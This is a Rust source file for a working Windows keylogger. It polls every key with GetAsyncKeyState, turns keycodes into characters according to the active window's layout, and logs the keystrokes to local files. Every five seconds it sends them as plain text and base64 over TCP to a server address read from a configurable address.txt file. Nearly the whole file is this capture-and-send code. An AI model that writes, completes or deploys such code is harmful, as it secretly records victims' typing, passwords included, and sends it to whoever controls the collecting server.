use device_query::{DeviceQuery, DeviceState, Keycode};
use std::sync::mpsc::channel;
use std::sync::Arc;
use std::sync::Mutex;
use std::thread;
use std::time::Duration;
use std::io::{Read, Write};
use base64;
use std::convert::TryFrom;
use std::fs::OpenOptions;
use std::net::TcpStream;
use windows::core::Result;
use windows::core::PWSTR;
use windows::Win32::System::Threading::GetCurrentThreadId;
use windows::Win32::UI::Input::KeyboardAndMouse::ToUnicodeEx;
use windows::Win32::UI::Input::KeyboardAndMouse::{
    GetAsyncKeyState, GetKeyState, GetKeyboardLayout, GetKeyboardState, ToUnicode,
};
use windows::Win32::UI::WindowsAndMessaging::{GetForegroundWindow, GetWindowThreadProcessId};

// Key represents a single key entered by the user
#[derive(Debug, Clone)]
struct Key {
    empty: bool,        // Indicates if a key is pressed or not
    rune: Option<char>, // The character representation of the key
    keycode: i32,       // The keycode of the key
}

impl Key {
    fn new() -> Self {
        Self {
            empty: true,
            rune: None,
            keycode: 0,
        }
    }
}

fn main() {
    let (tx1, rx1) = channel::<Key>();
    let (tx2, rx2) = channel::<Key>();

    // let keys1 = Arc::new(Mutex::new(vec![]));
    let keys1 = Arc::new(Mutex::new(Vec::<Key>::new()));

    // Collection thread
    // let h1 = thread::spawn(move || );

    // Print all received keys to a file for debugging
    let h2 = thread::spawn(move || {
        let mut file = OpenOptions::new()
            .create(true)
            .write(true)
            .append(true)
            .open("pressed.txt")
            .unwrap();

        for received in rx1 {
            writeln!(file, "{:?}", received).unwrap();
        }
    });
    // for received in rx1 {
    //     println!("Thread 1: Received {:?}", received);
    // }

    // let h3 = thread::spawn(move || {
    //     let mut pressed_full = OpenOptions::new()
    //         .create(true)
    //         .write(true)
    //         .append(true)
    //         .open("pressed_full.txt")
    //         .unwrap();
    //     for received in rx2 {
    //         println!("Thread 2: Received {:?}", received);
    //     }
    // });

    let h3 = thread::spawn({
        let keys1 = Arc::clone(&keys1);
        move || loop {
            let mut pressed_full = OpenOptions::new()
                .create(true)
                .write(true)
                .append(true)
                .open("pressed_full.txt")
                .unwrap();
            let mut keys_string = String::new();

            {
                let mut keys1 = keys1.lock().unwrap();
                for key in keys1.drain(..) {
                    if let Some(r) = key.rune {
                        keys_string.push(r);
                    }
                }
            }
            if keys_string.len() > 0 {
                let keys_base64 = base64::encode(&keys_string);
                writeln!(pressed_full, "text: {}", keys_string);
                writeln!(pressed_full, "base64: {}", keys_base64);
                writeln!(pressed_full, "=======================================");

                let address = get_address();
                let mut stream = TcpStream::connect(address);
                match stream {
                    Ok(s) => {
                        let mut stream = s;
                        writeln!(stream, "{}", keys_string).unwrap();
                        writeln!(stream, "{}", keys_base64).unwrap();
                    },
                    Err(e) => {
                        println!("Error connecting to server: {}", e);
                        continue;
                    }
                }
            };

            thread::sleep(Duration::from_secs(5));
        }
    });

    loop {
        let next_key = get_next();

        tx1.send(next_key.clone()).unwrap();
        tx2.send(next_key.clone()).unwrap();

        {
            let mut keys1 = keys1.lock().unwrap();
            keys1.push(next_key.clone());
        }

        println!("next: {:?}", next_key);
    }

    // h1.join().unwrap();
    h2.join().unwrap();
    h3.join().unwrap();
}

// Get TCP address from the ./address.txt file if it exists other wise return the default address
fn get_address() -> String {
    let mut address = String::new();
    let mut file = OpenOptions::new()
        .read(true)
        .open("address.txt")
        .unwrap_or_else(|_| {
            // println!("No address.txt file found, using default address");
            let mut df = OpenOptions::new()
                .create(true)
                .write(true)
                .open("address.txt")
                .unwrap();
            df.write(b"127.0.0.1:4000").unwrap();
            df
        });
    let res = file.read_to_string(&mut address);
    match res {
        Ok(_) => {
            // println!("address.txt file found, using address: {}", address);
            address
        }
        Err(e) => {
            // println!("Error reading address.txt file: {}", e);
            "127.0.0.1:4000".to_string()
        }
    }
}

fn get_next() -> Key {
    let mut keyboard_state = [0u8; 256];

    let next = wait_for_next_key();
    // println!("next: {:?}", next);
    let t = unsafe { GetKeyboardState(&mut keyboard_state) };

    // Get the handle to the foreground window
    let foreground_window = unsafe { GetForegroundWindow() };
    // Get the thread id of the foreground window
    let thread_id = unsafe { GetWindowThreadProcessId(foreground_window, None) };
    // Get the keyboard layout for the foreground thread
    let layout = unsafe { GetKeyboardLayout(thread_id) };
    let mut pwszbuff = [0u16; 1]; // Create a buffer
                                  // Use the correct arguments for ToUnicodeEx
    let code = unsafe {
        ToUnicodeEx(
            next as u32, // Use the key code as `wvirtkey`
            0, // `wscancode`, it's usually obtained from a WM_KEYDOWN or WM_KEYUP message.
            &keyboard_state,
            &mut pwszbuff, // Pass the buffer
            0,             // `wflags`, always 0 for this usage
            layout,
        )
    };
    // println!("typeing {}: {} kb: {:?}", i, code, layout);
    // println!(">>> buff {:?}",  pwszbuff);

    let mut key = Key::new();
    key.empty = false;
    key.keycode = next;

    // let code_point: u32 = 1567; ///ssssfqwewerdfgrtasd
    let code_point: u32 = pwszbuff[0] as u32;
    if let Some(character) = char::from_u32(code_point) {
        // let character = character.to_string();
        if character.is_control() {
            // println!("{} is a control character", code_point);
            key.empty = true;
        } else {
            key.rune = Some(character);
            let character_string = character.to_string();
            // println!("{}", character_string);
        }
        // println!(">>> {}", character_string);
    } else {
        key.empty = true;
        // println!("Invalid Unicode code point: {}", code_point);
    };

    key
}

fn wait_for_next_key() -> i32 {
    let keycodes = get_main_key_codes();
    let mut last_key: Option<i32> = None;
    loop {
        for &key in keycodes.iter() {
            let key_code = unsafe { GetAsyncKeyState(key) };
            if key_code == 0 {
                if let Some(last) = last_key {
                    if last == key {
                        return key;
                    }
                }
                continue;
            }

            // The shift is for only pressed key
            if key_code != -32768 || key_code & (1 << 15) == 0 {
                continue;
            }
            last_key = Some(key);
        }
        thread::sleep(Duration::from_millis(5));
    }
}

fn get_main_key_codes() -> Vec<i32> {
    let mut keycodes = vec![];
    // Iterate from 0 to 255 inclusive
    for i in 0..=255 {
        if is_known_win_key(i) {
            keycodes.push(i);
        }
    }
    keycodes
}

fn is_known_win_key(win_key1: i32) -> bool {
    use windows::Win32::UI::Input::KeyboardAndMouse::*;
    let win_key = VIRTUAL_KEY(win_key1 as u16);
    match win_key {
        VK_F1 => true,
        VK_F2 => true,
        VK_F3 => true,
        VK_F4 => true,
        VK_F5 => true,
        VK_F6 => true,
        VK_F7 => true,
        VK_F8 => true,
        VK_F9 => true,
        VK_F10 => true,
        VK_F11 => true,
        VK_F12 => true,
        VK_NUMPAD0 => true,
        VK_NUMPAD1 => true,
        VK_NUMPAD2 => true,
        VK_NUMPAD3 => true,
        VK_NUMPAD4 => true,
        VK_NUMPAD5 => true,
        VK_NUMPAD6 => true,
        VK_NUMPAD7 => true,
        VK_NUMPAD8 => true,
        VK_NUMPAD9 => true,
        VK_ADD => true,
        VK_SUBTRACT => true,
        VK_DIVIDE => true,
        VK_MULTIPLY => true,
        VK_SPACE => true,
        VK_LCONTROL => true,
        VK_RCONTROL => true,
        VK_LSHIFT => true,
        VK_RSHIFT => true,
        VK_LMENU => true,
        VK_RMENU => true,
        VK_LWIN => true,
        VK_RWIN => true,
        VK_RETURN => true,
        VK_ESCAPE => true,
        VK_UP => true,
        VK_DOWN => true,
        VK_LEFT => true,
        VK_RIGHT => true,
        VK_BACK => true,
        VK_CAPITAL => true,
        VK_TAB => true,
        VK_HOME => true,
        VK_END => true,
        VK_PRIOR => true,
        VK_NEXT => true,
        VK_INSERT => true,
        VK_DELETE => true,
        VK_OEM_3 => true,
        VK_OEM_MINUS => true,
        VK_OEM_PLUS => true,
        VK_OEM_4 => true,
        VK_OEM_6 => true,
        VK_OEM_5 => true,
        VK_OEM_1 => true,
        VK_OEM_7 => true,
        VK_OEM_COMMA => true,
        VK_OEM_PERIOD => true,
        VK_OEM_2 => true,

        _ => {
            let win_key = win_key.0 as u8;
            match win_key as char {
                '0'..='9' | 'A'..='Z' => true,
                _ => false,
            }
        }
    }
}


///// bk ///

fn main2() {
    let keys1 = Arc::new(Mutex::new(vec![]));
    let keys2 = Arc::new(Mutex::new(vec![]));

    // Collection thread
    let h1 = std::thread::spawn({
        let keys1 = keys1.clone();
        move || {
            loop {
                let next_key = get_next();
                // Push to keys1 and keys2
                {
                    let mut keys1 = keys1.lock().unwrap();
                    keys1.push(next_key.clone());
                }
                {
                    let mut keys2 = keys2.lock().unwrap();
                    keys2.push(next_key.clone());
                }
                println!("next: {:?}", next_key);
            }
        }
    });

    h1.join();
}
